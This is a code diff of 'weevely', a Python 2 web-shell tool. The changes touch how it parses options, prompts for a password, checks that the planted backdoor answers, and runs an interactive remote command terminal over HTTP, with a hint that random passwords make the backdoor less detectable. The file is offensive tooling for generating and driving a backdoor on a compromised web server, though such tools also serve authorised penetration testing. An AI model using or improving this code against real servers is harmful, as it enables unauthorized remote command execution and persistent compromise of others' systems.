@@ -39,12 +39,12 @@ class weevely:
     
     for o, a in opts:
 	if o in ("-g", "-generate"):
-	  mode='g'
+	  moderun='g'
 	if o in ("-t", "-terminal"):
-	  mode='t'
+	  moderun='t'
 	if o in ("-c", "-command"):
 	  cmnd=a
-	  mode='c'
+	  moderun='c'
 	  
 	if o in ("-u", "-url"):
 	  url=a
@@ -60,31 +60,34 @@ class weevely:
 	if o in ("-o", "-output"):
 	  outfile=a
 
-    if 'mode' in locals():
+    if 'moderun' in locals():
 
-      if mode=='c' or mode=='t':
+      if moderun=='c' or moderun=='t':
 	if 'url' not in locals():
 	  print "! Please specify URL (-u)"
 	  sys.exit(1)
 	  
-      if mode=='g':
+      if moderun=='g':
 	if 'outfile' not in locals():
 	  print "! Please specify where generate backdoor file (-o)"
 	  sys.exit(1)
 
       if 'pwd' not in locals():
-	if mode=='g':
+	if moderun=='g':
 	  print "+ Random alphanumeric password (like 'a33k44') are less detectable."
-	print "+ Please insert password: ",
-	pwd = sys.stdin.readline()
+	  
+	pwd=''
+	while not pwd:
+	  print "+ Please insert password: ",
+	  pwd = sys.stdin.readline().strip()
 
 	
 
-      if mode=='c': 
-	self.execute(url,pwd,cmnd,mode)
-      if mode=='t':
-	self.terminal(url,pwd,mode)
-      if mode=='g':
+      if moderun=='c': 
+	self.execute(url,pwd,cmnd,0)
+      if moderun=='t':
+	self.terminal(url,pwd)
+      if moderun=='g':
 	self.generate(pwd,outfile)
     else:
       self.usage()
@@ -123,11 +126,16 @@ class weevely:
     try: 
       ret=self.execHTTPGet(refurl,url)
     except urllib2.URLError, e:
-      return str(e.reason)
+      #return str(e)
+      raise
     else: 
       restring='<' + pwd + '>(.*)</' + pwd + '>'
       e = re.compile(restring,re.DOTALL)
-      print e.findall(ret)[0]
+      founded=e.findall(ret)
+      if len(founded)<1:
+	raise Exception('request doesn\'t produce a valid respond')
+      else:
+	return founded[0].strip()
     
   def execHTTPGet(self, refurl, url):
     req = urllib2.Request(url)
@@ -135,19 +143,23 @@ class weevely:
     r = urllib2.urlopen(req)
     return r.read()
     
-  def terminal(self, url, pwd, mode):
-    print '+ Backdoor verification...',
-    ret = self.execute(url, pwd, "echo " + pwd, mode)
-    if (ret is not pwd):
-      print 'failed: ' + ret
-    else:	
-      print 'succeeded.' 
+  def terminal(self, url, pwd):
+    try:
+      ret = self.execute(url, pwd, "echo " + pwd, 0)
+    except Exception, e:
+      print '! Backdoor verification failed: ' + str(e) + '.'
+      return
+    
+    if pwd!=ret:
+      print '! Backdoor verification failed.'
+      return
+    else:
       while True:
 	print "> ",
 	cmnd = sys.stdin.readline()
 	if cmnd!='\n':
-	  self.execute(url, pwd, cmnd, mode)
-	  
+	  print self.execute(url, pwd, cmnd, 0)
+
   def generate(self,key,path):
     print self.crypt(back,key)
     
